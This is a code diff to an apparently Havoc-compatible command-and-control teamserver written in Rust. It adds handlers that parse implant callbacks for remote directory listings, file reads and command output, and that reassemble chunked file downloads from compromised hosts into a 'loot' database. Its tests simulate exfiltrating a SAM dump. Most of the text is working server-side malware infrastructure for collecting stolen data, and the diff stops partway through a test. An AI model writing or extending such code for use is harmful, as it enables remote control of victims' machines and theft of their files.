@@ -10,9 +10,9 @@ use base64::Engine as _;
 use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
 use red_cell_common::crypto::{AGENT_IV_LENGTH, AGENT_KEY_LENGTH, encrypt_agent_data};
 use red_cell_common::demon::{
-    DemonCommand, DemonInjectError, DemonKerberosCommand, DemonMessage, DemonPackage,
-    DemonProcessCommand, DemonProtocolError, DemonSocketCommand, DemonSocketType,
-    DemonTokenCommand,
+    DemonCallback, DemonCommand, DemonFilesystemCommand, DemonInjectError, DemonKerberosCommand,
+    DemonMessage, DemonPackage, DemonProcessCommand, DemonProtocolError, DemonSocketCommand,
+    DemonSocketType, DemonTokenCommand,
 };
 use red_cell_common::operator::{
     AgentEncryptionInfo as OperatorAgentEncryptionInfo, AgentInfo as OperatorAgentInfo,
@@ -23,6 +23,7 @@ use serde_json::Value;
 use thiserror::Error;
 use time::OffsetDateTime;
 use time::format_description::well_known::Rfc3339;
+use tokio::sync::RwLock;
 
 use crate::{
     AgentRegistry, Database, DemonCallbackPackage, DemonPacketParser, EventBus, LootRecord,
@@ -32,6 +33,20 @@ use crate::{
 type HandlerFuture =
     Pin<Box<dyn Future<Output = Result<Option<Vec<u8>>, CommandDispatchError>> + Send>>;
 type Handler = dyn Fn(u32, u32, Vec<u8>) -> HandlerFuture + Send + Sync + 'static;
+
+#[derive(Clone, Debug, Default)]
+struct DownloadTracker {
+    inner: Arc<RwLock<HashMap<(u32, u32), DownloadState>>>,
+}
+
+#[derive(Clone, Debug, PartialEq, Eq)]
+struct DownloadState {
+    request_id: u32,
+    remote_path: String,
+    expected_size: u64,
+    data: Vec<u8>,
+    started_at: String,
+}
 
 /// Error returned while routing or executing a Demon command handler.
 #[derive(Debug, Error)]
@@ -113,6 +128,7 @@ impl CommandDispatcher {
         sockets: SocketRelayManager,
     ) -> Self {
         let mut dispatcher = Self::new();
+        let downloads = DownloadTracker::default();
 
         let get_job_registry = registry.clone();
         dispatcher.register_handler(
@@ -145,6 +161,24 @@ impl CommandDispatcher {
             },
         );
 
+        let fs_database = database.clone();
+        let fs_events = events.clone();
+        let fs_downloads = downloads.clone();
+        dispatcher.register_handler(
+            u32::from(DemonCommand::CommandFs),
+            move |agent_id, request_id, payload| {
+                let database = fs_database.clone();
+                let events = fs_events.clone();
+                let downloads = fs_downloads.clone();
+                Box::pin(async move {
+                    handle_filesystem_callback(
+                        &database, &events, &downloads, agent_id, request_id, &payload,
+                    )
+                    .await
+                })
+            },
+        );
+
         let proc_events = events.clone();
         dispatcher.register_handler(
             u32::from(DemonCommand::CommandProc),
@@ -163,6 +197,35 @@ impl CommandDispatcher {
                 let events = inject_events.clone();
                 Box::pin(async move {
                     handle_inject_shellcode_callback(&events, agent_id, request_id, &payload).await
+                })
+            },
+        );
+
+        let command_output_events = events.clone();
+        dispatcher.register_handler(
+            u32::from(DemonCommand::CommandOutput),
+            move |agent_id, request_id, payload| {
+                let events = command_output_events.clone();
+                Box::pin(async move {
+                    handle_command_output_callback(&events, agent_id, request_id, &payload).await
+                })
+            },
+        );
+
+        let beacon_database = database.clone();
+        let beacon_events = events.clone();
+        let beacon_downloads = downloads.clone();
+        dispatcher.register_handler(
+            u32::from(DemonCommand::BeaconOutput),
+            move |agent_id, request_id, payload| {
+                let database = beacon_database.clone();
+                let events = beacon_events.clone();
+                let downloads = beacon_downloads.clone();
+                Box::pin(async move {
+                    handle_beacon_output_callback(
+                        &database, &events, &downloads, agent_id, request_id, &payload,
+                    )
+                    .await
                 })
             },
         );
@@ -537,17 +600,33 @@ async fn dispatch_builtin_package(
     request_id: u32,
     payload: &[u8],
 ) -> Result<Option<Vec<u8>>, CommandDispatchError> {
+    let downloads = DownloadTracker::default();
     if command_id == u32::from(DemonCommand::CommandGetJob) {
         return Ok(None);
     }
     if command_id == u32::from(DemonCommand::CommandCheckin) {
         return handle_checkin(registry, events, agent_id).await;
     }
+    if command_id == u32::from(DemonCommand::CommandFs) {
+        return handle_filesystem_callback(
+            database, events, &downloads, agent_id, request_id, payload,
+        )
+        .await;
+    }
     if command_id == u32::from(DemonCommand::CommandProcList) {
         return handle_process_list_callback(events, agent_id, request_id, payload).await;
     }
     if command_id == u32::from(DemonCommand::CommandProc) {
         return handle_process_command_callback(events, agent_id, request_id, payload).await;
+    }
+    if command_id == u32::from(DemonCommand::CommandOutput) {
+        return handle_command_output_callback(events, agent_id, request_id, payload).await;
+    }
+    if command_id == u32::from(DemonCommand::BeaconOutput) {
+        return handle_beacon_output_callback(
+            database, events, &downloads, agent_id, request_id, payload,
+        )
+        .await;
     }
     if command_id == u32::from(DemonCommand::CommandInjectShellcode) {
         return handle_inject_shellcode_callback(events, agent_id, request_id, payload).await;
@@ -575,6 +654,675 @@ async fn dispatch_builtin_package(
 
 fn inner_demon_agent_id(bytes: &[u8]) -> Result<u32, DemonProtocolError> {
     Ok(red_cell_common::demon::DemonEnvelope::from_bytes(bytes)?.header.agent_id)
+}
+
+impl DownloadTracker {
+    async fn start(&self, agent_id: u32, file_id: u32, state: DownloadState) {
+        self.inner.write().await.insert((agent_id, file_id), state);
+    }
+
+    async fn append(
+        &self,
+        agent_id: u32,
+        file_id: u32,
+        chunk: &[u8],
+    ) -> Result<DownloadState, CommandDispatchError> {
+        let mut state = self.inner.write().await;
+        let Some(download) = state.get_mut(&(agent_id, file_id)) else {
+            return Err(CommandDispatchError::InvalidCallbackPayload {
+                command_id: u32::from(DemonCommand::BeaconOutput),
+                message: format!("download 0x{file_id:08X} was not opened"),
+            });
+        };
+        download.data.extend_from_slice(chunk);
+        Ok(download.clone())
+    }
+
+    async fn finish(&self, agent_id: u32, file_id: u32) -> Option<DownloadState> {
+        self.inner.write().await.remove(&(agent_id, file_id))
+    }
+}
+
+async fn handle_command_output_callback(
+    events: &EventBus,
+    agent_id: u32,
+    request_id: u32,
+    payload: &[u8],
+) -> Result<Option<Vec<u8>>, CommandDispatchError> {
+    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandOutput));
+    let output = parser.read_string("command output text")?;
+    if output.is_empty() {
+        return Ok(None);
+    }
+
+    events.broadcast(agent_response_event(
+        agent_id,
+        u32::from(DemonCommand::CommandOutput),
+        request_id,
+        "Good",
+        &format!("Received Output [{} bytes]:", output.len()),
+        Some(output),
+    )?);
+    Ok(None)
+}
+
+async fn handle_beacon_output_callback(
+    database: &Database,
+    events: &EventBus,
+    downloads: &DownloadTracker,
+    agent_id: u32,
+    request_id: u32,
+    payload: &[u8],
+) -> Result<Option<Vec<u8>>, CommandDispatchError> {
+    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::BeaconOutput));
+    let callback = parser.read_u32("beacon callback type")?;
+
+    match DemonCallback::try_from(callback).map_err(|error| {
+        CommandDispatchError::InvalidCallbackPayload {
+            command_id: u32::from(DemonCommand::BeaconOutput),
+            message: error.to_string(),
+        }
+    })? {
+        DemonCallback::Output => {
+            let output = parser.read_string("beacon output text")?;
+            if !output.is_empty() {
+                events.broadcast(agent_response_event(
+                    agent_id,
+                    u32::from(DemonCommand::BeaconOutput),
+                    request_id,
+                    "Good",
+                    &format!("Received Output [{} bytes]:", output.len()),
+                    Some(output),
+                )?);
+            }
+        }
+        DemonCallback::OutputOem | DemonCallback::OutputUtf8 => {
+            let output = parser.read_utf16("beacon output utf16")?;
+            if !output.is_empty() {
+                events.broadcast(agent_response_event(
+                    agent_id,
+                    u32::from(DemonCommand::BeaconOutput),
+                    request_id,
+                    "Good",
+                    &format!("Received Output [{} bytes]:", output.len()),
+                    Some(output),
+                )?);
+            }
+        }
+        DemonCallback::ErrorMessage => {
+            let output = parser.read_string("beacon error text")?;
+            if !output.is_empty() {
+                events.broadcast(agent_response_event(
+                    agent_id,
+                    u32::from(DemonCommand::BeaconOutput),
+                    request_id,
+                    "Error",
+                    &format!("Received Output [{} bytes]:", output.len()),
+                    Some(output),
+                )?);
+            }
+        }
+        DemonCallback::File => {
+            let bytes = parser.read_bytes("beacon file open")?;
+            let (file_id, expected_size, remote_path) =
+                parse_file_open_header(u32::from(DemonCommand::BeaconOutput), &bytes)?;
+            let started_at = OffsetDateTime::now_utc().format(&Rfc3339)?;
+            downloads
+                .start(
+                    agent_id,
+                    file_id,
+                    DownloadState {
+                        request_id,
+                        remote_path: remote_path.clone(),
+                        expected_size,
+                        data: Vec::new(),
+                        started_at,
+                    },
+                )
+                .await;
+            events.broadcast(download_progress_event(
+                agent_id,
+                u32::from(DemonCommand::BeaconOutput),
+                request_id,
+                file_id,
+                &remote_path,
+                0,
+                expected_size,
+                "Started",
+            )?);
+        }
+        DemonCallback::FileWrite => {
+            let bytes = parser.read_bytes("beacon file write")?;
+            let (file_id, chunk) = parse_file_chunk(u32::from(DemonCommand::BeaconOutput), &bytes)?;
+            let state = downloads.append(agent_id, file_id, &chunk).await?;
+            events.broadcast(download_progress_event(
+                agent_id,
+                u32::from(DemonCommand::BeaconOutput),
+                state.request_id,
+                file_id,
+                &state.remote_path,
+                u64::try_from(state.data.len()).unwrap_or_default(),
+                state.expected_size,
+                "InProgress",
+            )?);
+        }
+        DemonCallback::FileClose => {
+            let bytes = parser.read_bytes("beacon file close")?;
+            let file_id = parse_file_close(u32::from(DemonCommand::BeaconOutput), &bytes)?;
+            if let Some(state) = downloads.finish(agent_id, file_id).await {
+                persist_download(database, agent_id, file_id, &state).await?;
+                events.broadcast(download_complete_event(
+                    agent_id,
+                    u32::from(DemonCommand::BeaconOutput),
+                    state.request_id,
+                    file_id,
+                    &state,
+                )?);
+            }
+        }
+    }
+
+    Ok(None)
+}
+
+async fn handle_filesystem_callback(
+    database: &Database,
+    events: &EventBus,
+    downloads: &DownloadTracker,
+    agent_id: u32,
+    request_id: u32,
+    payload: &[u8],
+) -> Result<Option<Vec<u8>>, CommandDispatchError> {
+    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandFs));
+    let subcommand = parser.read_u32("filesystem subcommand")?;
+    let subcommand = DemonFilesystemCommand::try_from(subcommand).map_err(|error| {
+        CommandDispatchError::InvalidCallbackPayload {
+            command_id: u32::from(DemonCommand::CommandFs),
+            message: error.to_string(),
+        }
+    })?;
+    match subcommand {
+        DemonFilesystemCommand::Dir => {
+            let explorer = parser.read_bool("filesystem dir explorer")?;
+            let list_only = parser.read_bool("filesystem dir list only")?;
+            let root_path = parser.read_utf16("filesystem dir root path")?;
+            let success = parser.read_bool("filesystem dir success")?;
+            let mut lines = Vec::new();
+            let mut explorer_rows = Vec::new();
+
+            if success {
+                while !parser.is_empty() {
+                    let path = parser.read_utf16("filesystem dir path")?;
+                    let file_count = parser.read_u32("filesystem dir file count")?;
+                    let dir_count = parser.read_u32("filesystem dir dir count")?;
+                    let total_size = if list_only {
+                        None
+                    } else {
+                        Some(parser.read_u64("filesystem dir total size")?)
+                    };
+
+                    if !explorer {
+                        lines.push(format!(" Directory of {path}"));
+                        lines.push(String::new());
+                    }
+
+                    let item_count = file_count + dir_count;
+                    for _ in 0..item_count {
+                        let name = parser.read_utf16("filesystem dir item name")?;
+                        if list_only {
+                            lines.push(format!("{}{}", path.trim_end_matches('*'), name));
+                            continue;
+                        }
+                        let is_dir = parser.read_bool("filesystem dir item is dir")?;
+                        let size = parser.read_u64("filesystem dir item size")?;
+                        let day = parser.read_u32("filesystem dir item day")?;
+                        let month = parser.read_u32("filesystem dir item month")?;
+                        let year = parser.read_u32("filesystem dir item year")?;
+                        let minute = parser.read_u32("filesystem dir item minute")?;
+                        let hour = parser.read_u32("filesystem dir item hour")?;
+                        let modified = format!("{day:02}/{month:02}/{year}  {hour:02}:{minute:02}");
+                        if explorer {
+                            explorer_rows.push(Value::Object(
+                                [
+                                    (
+                                        "Type".to_owned(),
+                                        Value::String(if is_dir { "dir" } else { "" }.to_owned()),
+                                    ),
+                                    (
+                                        "Size".to_owned(),
+                                        Value::String(if is_dir {
+                                            String::new()
+                                        } else {
+                                            byte_count(size)
+                                        }),
+                                    ),
+                                    ("Modified".to_owned(), Value::String(modified)),
+                                    ("Name".to_owned(), Value::String(name)),
+                                ]
+                                .into_iter()
+                                .collect(),
+                            ));
+                        } else {
+                            let dir_text = if is_dir { "<DIR>" } else { "" };
+                            let size_text = if is_dir { String::new() } else { byte_count(size) };
+                            lines.push(format!(
+                                "{modified:<17}    {dir_text:<5}  {size_text:<12}   {name}"
+                            ));
+                        }
+                    }
+
+                    if !explorer && !list_only && (file_count > 0 || dir_count > 0) {
+                        lines.push(format!(
+                            "               {file_count} File(s)     {}",
+                            byte_count(total_size.unwrap_or_default())
+                        ));
+                        lines.push(format!("               {dir_count} Folder(s)"));
+                        lines.push(String::new());
+                    }
+                }
+            }
+
+            let output = if lines.is_empty() {
+                "No file or folder was found".to_owned()
+            } else {
+                lines.join("\n").trim().to_owned()
+            };
+            let mut extra = BTreeMap::new();
+            if explorer {
+                extra.insert("MiscType".to_owned(), Value::String("FileExplorer".to_owned()));
+                extra.insert(
+                    "MiscData".to_owned(),
+                    Value::String(
+                        BASE64_STANDARD.encode(
+                            serde_json::to_vec(&Value::Object(
+                                [
+                                    ("Path".to_owned(), Value::String(root_path)),
+                                    ("Files".to_owned(), Value::Array(explorer_rows)),
+                                ]
+                                .into_iter()
+                                .collect(),
+                            ))
+                            .map_err(|error| {
+                                CommandDispatchError::InvalidCallbackPayload {
+                                    command_id: u32::from(DemonCommand::CommandFs),
+                                    message: error.to_string(),
+                                }
+                            })?,
+                        ),
+                    ),
+                );
+            }
+            events.broadcast(agent_response_event_with_extra(
+                agent_id,
+                u32::from(DemonCommand::CommandFs),
+                request_id,
+                "Info",
+                if output == "No file or folder was found" {
+                    "No file or folder was found"
+                } else {
+                    "Directory listing completed"
+                },
+                extra,
+                output,
+            )?);
+        }
+        DemonFilesystemCommand::Download => {
+            let mode = parser.read_u32("filesystem download mode")?;
+            let file_id = parser.read_u32("filesystem download file id")?;
+            match mode {
+                0 => {
+                    let expected_size = parser.read_u64("filesystem download size")?;
+                    let remote_path = parser.read_utf16("filesystem download path")?;
+                    let started_at = OffsetDateTime::now_utc().format(&Rfc3339)?;
+                    downloads
+                        .start(
+                            agent_id,
+                            file_id,
+                            DownloadState {
+                                request_id,
+                                remote_path: remote_path.clone(),
+                                expected_size,
+                                data: Vec::new(),
+                                started_at,
+                            },
+                        )
+                        .await;
+                    events.broadcast(download_progress_event(
+                        agent_id,
+                        u32::from(DemonCommand::CommandFs),
+                        request_id,
+                        file_id,
+                        &remote_path,
+                        0,
+                        expected_size,
+                        "Started",
+                    )?);
+                }
+                1 => {
+                    let chunk = parser.read_bytes("filesystem download chunk")?;
+                    let state = downloads.append(agent_id, file_id, &chunk).await?;
+                    events.broadcast(download_progress_event(
+                        agent_id,
+                        u32::from(DemonCommand::CommandFs),
+                        state.request_id,
+                        file_id,
+                        &state.remote_path,
+                        u64::try_from(state.data.len()).unwrap_or_default(),
+                        state.expected_size,
+                        "InProgress",
+                    )?);
+                }
+                2 => {
+                    let reason = parser.read_u32("filesystem download close reason")?;
+                    if let Some(state) = downloads.finish(agent_id, file_id).await {
+                        if reason == 0 {
+                            persist_download(database, agent_id, file_id, &state).await?;
+                            events.broadcast(download_complete_event(
+                                agent_id,
+                                u32::from(DemonCommand::CommandFs),
+                                state.request_id,
+                                file_id,
+                                &state,
+                            )?);
+                        } else {
+                            events.broadcast(download_progress_event(
+                                agent_id,
+                                u32::from(DemonCommand::CommandFs),
+                                state.request_id,
+                                file_id,
+                                &state.remote_path,
+                                u64::try_from(state.data.len()).unwrap_or_default(),
+                                state.expected_size,
+                                "Removed",
+                            )?);
+                        }
+                    }
+                }
+                other => {
+                    return Err(CommandDispatchError::InvalidCallbackPayload {
+                        command_id: u32::from(DemonCommand::CommandFs),
+                        message: format!("unsupported filesystem download mode {other}"),
+                    });
+                }
+            }
+        }
+        DemonFilesystemCommand::Upload => {
+            let size = parser.read_u32("filesystem upload size")?;
+            let path = parser.read_utf16("filesystem upload path")?;
+            events.broadcast(agent_response_event(
+                agent_id,
+                u32::from(DemonCommand::CommandFs),
+                request_id,
+                "Info",
+                &format!("Uploaded file: {path} ({size} bytes)"),
+                None,
+            )?);
+        }
+        DemonFilesystemCommand::Cd => {
+            let path = parser.read_utf16("filesystem cd path")?;
+            events.broadcast(agent_response_event(
+                agent_id,
+                u32::from(DemonCommand::CommandFs),
+                request_id,
+                "Info",
+                &format!("Changed directory: {path}"),
+                None,
+            )?);
+        }
+        DemonFilesystemCommand::Remove => {
+            let is_dir = parser.read_bool("filesystem remove is dir")?;
+            let path = parser.read_utf16("filesystem remove path")?;
+            let noun = if is_dir { "directory" } else { "file" };
+            events.broadcast(agent_response_event(
+                agent_id,
+                u32::from(DemonCommand::CommandFs),
+                request_id,
+                "Info",
+                &format!("Removed {noun}: {path}"),
+                None,
+            )?);
+        }
+        DemonFilesystemCommand::Mkdir => {
+            let path = parser.read_utf16("filesystem mkdir path")?;
+            events.broadcast(agent_response_event(
+                agent_id,
+                u32::from(DemonCommand::CommandFs),
+                request_id,
+                "Info",
+                &format!("Created directory: {path}"),
+                None,
+            )?);
+        }
+        DemonFilesystemCommand::Copy | DemonFilesystemCommand::Move => {
+            let success = parser.read_bool("filesystem copy/move success")?;
+            let from = parser.read_utf16("filesystem copy/move from")?;
+            let to = parser.read_utf16("filesystem copy/move to")?;
+            let verb =
+                if matches!(subcommand, DemonFilesystemCommand::Copy) { "copied" } else { "moved" };
+            let kind = if success { "Good" } else { "Error" };
+            let message = if success {
+                format!("Successfully {verb} file {from} to {to}")
+            } else {
+                format!("Failed to {verb} file {from} to {to}")
+            };
+            events.broadcast(agent_response_event(
+                agent_id,
+                u32::from(DemonCommand::CommandFs),
+                request_id,
+                kind,
+                &message,
+                None,
+            )?);
+        }
+        DemonFilesystemCommand::GetPwd => {
+            let path = parser.read_utf16("filesystem pwd path")?;
+            events.broadcast(agent_response_event(
+                agent_id,
+                u32::from(DemonCommand::CommandFs),
+                request_id,
+                "Info",
+                &format!("Current directory: {path}"),
+                None,
+            )?);
+        }
+        DemonFilesystemCommand::Cat => {
+            let path = parser.read_utf16("filesystem cat path")?;
+            let success = parser.read_bool("filesystem cat success")?;
+            let output = parser.read_string("filesystem cat output")?;
+            let (kind, message) = if success {
+                ("Info", format!("File content of {path} ({}):", output.len()))
+            } else {
+                ("Erro", format!("Failed to read file: {path}"))
+            };
+            events.broadcast(agent_response_event(
+                agent_id,
+                u32::from(DemonCommand::CommandFs),
+                request_id,
+                kind,
+                &message,
+                if success { Some(output) } else { None },
+            )?);
+        }
+    }
+
+    Ok(None)
+}
+
+fn parse_file_open_header(
+    command_id: u32,
+    bytes: &[u8],
+) -> Result<(u32, u64, String), CommandDispatchError> {
+    if bytes.len() < 8 {
+        return Err(CommandDispatchError::InvalidCallbackPayload {
+            command_id,
+            message: format!("file open payload: expected at least 8 bytes, got {}", bytes.len()),
+        });
+    }
+    let file_id = u32::from_be_bytes(bytes[0..4].try_into().map_err(|_| {
+        CommandDispatchError::InvalidCallbackPayload {
+            command_id,
+            message: "file id parse failure".to_owned(),
+        }
+    })?);
+    let expected_size = u64::from(u32::from_be_bytes(bytes[4..8].try_into().map_err(|_| {
+        CommandDispatchError::InvalidCallbackPayload {
+            command_id,
+            message: "file size parse failure".to_owned(),
+        }
+    })?));
+    let path = String::from_utf8_lossy(&bytes[8..]).trim_end_matches('\0').to_owned();
+    Ok((file_id, expected_size, path))
+}
+
+fn parse_file_chunk(command_id: u32, bytes: &[u8]) -> Result<(u32, Vec<u8>), CommandDispatchError> {
+    if bytes.len() < 4 {
+        return Err(CommandDispatchError::InvalidCallbackPayload {
+            command_id,
+            message: format!("file chunk payload: expected at least 4 bytes, got {}", bytes.len()),
+        });
+    }
+    let file_id = u32::from_be_bytes(bytes[0..4].try_into().map_err(|_| {
+        CommandDispatchError::InvalidCallbackPayload {
+            command_id,
+            message: "file id parse failure".to_owned(),
+        }
+    })?);
+    Ok((file_id, bytes[4..].to_vec()))
+}
+
+fn parse_file_close(command_id: u32, bytes: &[u8]) -> Result<u32, CommandDispatchError> {
+    if bytes.len() < 4 {
+        return Err(CommandDispatchError::InvalidCallbackPayload {
+            command_id,
+            message: format!("file close payload: expected 4 bytes, got {}", bytes.len()),
+        });
+    }
+    let file_id = u32::from_be_bytes(bytes[0..4].try_into().map_err(|_| {
+        CommandDispatchError::InvalidCallbackPayload {
+            command_id,
+            message: "file close parse failure".to_owned(),
+        }
+    })?);
+    Ok(file_id)
+}
+
+async fn persist_download(
+    database: &Database,
+    agent_id: u32,
+    file_id: u32,
+    state: &DownloadState,
+) -> Result<(), CommandDispatchError> {
+    let name = state
+        .remote_path
+        .replace('\\', "/")
+        .rsplit('/')
+        .next()
+        .unwrap_or(state.remote_path.as_str())
+        .trim_end_matches('\0')
+        .to_owned();
+    database
+        .loot()
+        .create(&LootRecord {
+            id: None,
+            agent_id,
+            kind: "download".to_owned(),
+            name,
+            file_path: Some(state.remote_path.clone()),
+            size_bytes: Some(i64::try_from(state.data.len()).unwrap_or_default()),
+            captured_at: OffsetDateTime::now_utc().format(&Rfc3339)?,
+            data: Some(state.data.clone()),
+            metadata: Some(Value::Object(
+                [
+                    ("file_id".to_owned(), Value::String(format!("{file_id:08X}"))),
+                    ("request_id".to_owned(), Value::String(format!("{:X}", state.request_id))),
+                    ("expected_size".to_owned(), Value::String(state.expected_size.to_string())),
+                    ("started_at".to_owned(), Value::String(state.started_at.clone())),
+                ]
+                .into_iter()
+                .collect(),
+            )),
+        })
+        .await?;
+    Ok(())
+}
+
+fn download_progress_event(
+    agent_id: u32,
+    command_id: u32,
+    request_id: u32,
+    file_id: u32,
+    remote_path: &str,
+    current_size: u64,
+    expected_size: u64,
+    state: &str,
+) -> Result<OperatorMessage, CommandDispatchError> {
+    let message = format!(
+        "{state} download of file: {remote_path} [{}/{}]",
+        byte_count(current_size),
+        byte_count(expected_size)
+    );
+    agent_response_event_with_extra(
+        agent_id,
+        command_id,
+        request_id,
+        "Info",
+        &message,
+        BTreeMap::from([
+            ("MiscType".to_owned(), Value::String("download-progress".to_owned())),
+            ("FileID".to_owned(), Value::String(format!("{file_id:08X}"))),
+            ("FileName".to_owned(), Value::String(remote_path.to_owned())),
+            ("CurrentSize".to_owned(), Value::String(current_size.to_string())),
+            ("ExpectedSize".to_owned(), Value::String(expected_size.to_string())),
+            ("State".to_owned(), Value::String(state.to_owned())),
+        ]),
+        String::new(),
+    )
+}
+
+fn download_complete_event(
+    agent_id: u32,
+    command_id: u32,
+    request_id: u32,
+    file_id: u32,
+    state: &DownloadState,
+) -> Result<OperatorMessage, CommandDispatchError> {
+    agent_response_event_with_extra(
+        agent_id,
+        command_id,
+        request_id,
+        "Good",
+        &format!("Finished download of file: {}", state.remote_path),
+        BTreeMap::from([
+            ("MiscType".to_owned(), Value::String("download".to_owned())),
+            ("FileID".to_owned(), Value::String(format!("{file_id:08X}"))),
+            ("FileName".to_owned(), Value::String(state.remote_path.clone())),
+            ("MiscData".to_owned(), Value::String(BASE64_STANDARD.encode(&state.data))),
+            (
+                "MiscData2".to_owned(),
+                Value::String(format!(
+                    "{};{}",
+                    BASE64_STANDARD.encode(state.remote_path.as_bytes()),
+                    byte_count(u64::try_from(state.data.len()).unwrap_or_default())
+                )),
+            ),
+        ]),
+        String::new(),
+    )
+}
+
+fn byte_count(size: u64) -> String {
+    const UNITS: [&str; 5] = ["B", "kB", "MB", "GB", "TB"];
+    let mut value = size as f64;
+    let mut unit = 0usize;
+    while value >= 1000.0 && unit < UNITS.len() - 1 {
+        value /= 1000.0;
+        unit += 1;
+    }
+    if unit == 0 {
+        format!("{size} {}", UNITS[unit])
+    } else {
+        format!("{value:.2} {}", UNITS[unit])
+    }
 }
 
 async fn handle_process_list_callback(
@@ -1545,6 +2293,30 @@ impl<'a> CallbackParser<'a> {
         Ok(value)
     }
 
+    fn read_u64(&mut self, context: &'static str) -> Result<u64, CommandDispatchError> {
+        let remaining = self.bytes.len().saturating_sub(self.offset);
+        if remaining < 8 {
+            return Err(CommandDispatchError::InvalidCallbackPayload {
+                command_id: self.command_id,
+                message: format!("{context}: expected 8 bytes, got {remaining}"),
+            });
+        }
+
+        let value =
+            u64::from_le_bytes(self.bytes[self.offset..self.offset + 8].try_into().map_err(
+                |_| CommandDispatchError::InvalidCallbackPayload {
+                    command_id: self.command_id,
+                    message: format!("{context}: failed to read u64"),
+                },
+            )?);
+        self.offset += 8;
+        Ok(value)
+    }
+
+    fn read_bool(&mut self, context: &'static str) -> Result<bool, CommandDispatchError> {
+        Ok(self.read_u32(context)? != 0)
+    }
+
     fn read_bytes(&mut self, context: &'static str) -> Result<Vec<u8>, CommandDispatchError> {
         let len = usize::try_from(self.read_u32(context)?).map_err(|_| {
             CommandDispatchError::InvalidCallbackPayload {
@@ -1593,8 +2365,9 @@ mod tests {
     use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
     use red_cell_common::crypto::{AGENT_IV_LENGTH, AGENT_KEY_LENGTH, decrypt_agent_data};
     use red_cell_common::demon::{
-        DemonCommand, DemonInjectError, DemonKerberosCommand, DemonMessage, DemonPivotCommand,
-        DemonProcessCommand, DemonTokenCommand,
+        DemonCallback, DemonCommand, DemonFilesystemCommand, DemonInjectError,
+        DemonKerberosCommand, DemonMessage, DemonPivotCommand, DemonProcessCommand,
+        DemonTokenCommand,
     };
     use red_cell_common::operator::OperatorMessage;
     use serde_json::Value;
@@ -2159,6 +2932,155 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn builtin_filesystem_download_handler_persists_loot_and_progress()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let database = Database::connect_in_memory().await?;
+        let registry = AgentRegistry::new(database.clone());
+        let events = EventBus::default();
+        let mut receiver = events.subscribe();
+        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
+        registry
+            .insert(sample_agent_info(
+                0xABCD_EF11,
+                [0x11; AGENT_KEY_LENGTH],
+                [0x22; AGENT_IV_LENGTH],
+            ))
+            .await?;
+        let dispatcher =
+            CommandDispatcher::with_builtin_handlers(registry, events, database.clone(), sockets);
+
+        let file_id = 0x33_u32;
+        let remote_path = "C:\\Temp\\sam.dump";
+        let content = b"secret-bytes";
+
+        let mut open = Vec::new();
+        add_u32(&mut open, u32::from(DemonFilesystemCommand::Download));
+        add_u32(&mut open, 0);
+        add_u32(&mut open, file_id);
+        add_u64(&mut open, u64::try_from(content.len())?);
+        add_utf16(&mut open, remote_path);
+        dispatcher.dispatch(0xABCD_EF11, u32::from(DemonCommand::CommandFs), 0x99, &open).await?;
+
+        let mut write = Vec::new();
+        add_u32(&mut write, u32::from(DemonFilesystemCommand::Download));
+        add_u32(&mut write, 1);
+        add_u32(&mut write, file_id);
+        add_bytes(&mut write, content);
+        dispatcher.dispatch(0xABCD_EF11, u32::from(DemonCommand::CommandFs), 0x99, &write).await?;
+
+        let mut close = Vec::new();
+        add_u32(&mut close, u32::from(DemonFilesystemCommand::Download));
+        add_u32(&mut close, 2);
+        add_u32(&mut close, file_id);
+        add_u32(&mut close, 0);
+        dispatcher.dispatch(0xABCD_EF11, u32::from(DemonCommand::CommandFs), 0x99, &close).await?;
+
+        let first = receiver.recv().await.ok_or("missing open event")?;
+        let second = receiver.recv().await.ok_or("missing progress event")?;
+        let third = receiver.recv().await.ok_or("missing completion event")?;
+
+        let OperatorMessage::AgentResponse(open_message) = first else {
+            panic!("expected download open response");
+        };
+        assert_eq!(
+            open_message.info.extra.get("MiscType"),
+            Some(&Value::String("download-progress".to_owned()))
+        );
+
+        let OperatorMessage::AgentResponse(progress_message) = second else {
+            panic!("expected download progress response");
+        };
+        assert_eq!(
+            progress_message.info.extra.get("CurrentSize"),
+            Some(&Value::String(content.len().to_string()))
+        );
+
+        let OperatorMessage::AgentResponse(done_message) = third else {
+            panic!("expected download completion response");
+        };
+        assert_eq!(
+            done_message.info.extra.get("MiscType"),
+            Some(&Value::String("download".to_owned()))
+        );
+        assert_eq!(
+            done_message.info.extra.get("MiscData"),
+            Some(&Value::String(BASE64_STANDARD.encode(content)))
+        );
+
+        let loot = database.loot().list_for_agent(0xABCD_EF11).await?;
+        assert_eq!(loot.len(), 1);
+        assert_eq!(loot[0].kind, "download");
+        assert_eq!(loot[0].file_path.as_deref(), Some(remote_path));
+        assert_eq!(loot[0].data.as_deref(), Some(content.as_slice()));
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn builtin_beacon_file_callbacks_reassemble_downloads()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let database = Database::connect_in_memory().await?;
+        let registry = AgentRegistry::new(database.clone());
+        let events = EventBus::default();
+        let mut receiver = events.subscribe();
+        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
+        registry
+            .insert(sample_agent_info(
+                0xABCD_EF21,
+                [0x11; AGENT_KEY_LENGTH],
+                [0x22; AGENT_IV_LENGTH],
+            ))
+            .await?;
+        let dispatcher =
+            CommandDispatcher::with_builtin_handlers(registry, events, database.clone(), sockets);
+
+        let file_id = 0x55_u32;
+        let remote_path = "C:\\Windows\\Temp\\note.txt";
+        let content = b"beacon-chunk";
+
+        let mut open_header = Vec::new();
+        open_header.extend_from_slice(&file_id.to_be_bytes());
+        open_header.extend_from_slice(&(u32::try_from(content.len())?).to_be_bytes());
+        open_header.extend_from_slice(remote_path.as_bytes());
+        let mut open = Vec::new();
+        add_u32(&mut open, u32::from(DemonCallback::File));
+        add_bytes(&mut open, &open_header);
+        dispatcher
+            .dispatch(0xABCD_EF21, u32::from(DemonCommand::BeaconOutput), 0x77, &open)
+            .await?;
+
+        let mut chunk = Vec::new();
+        chunk.extend_from_slice(&file_id.to_be_bytes());
+        chunk.extend_from_slice(content);
+        let mut write = Vec::new();
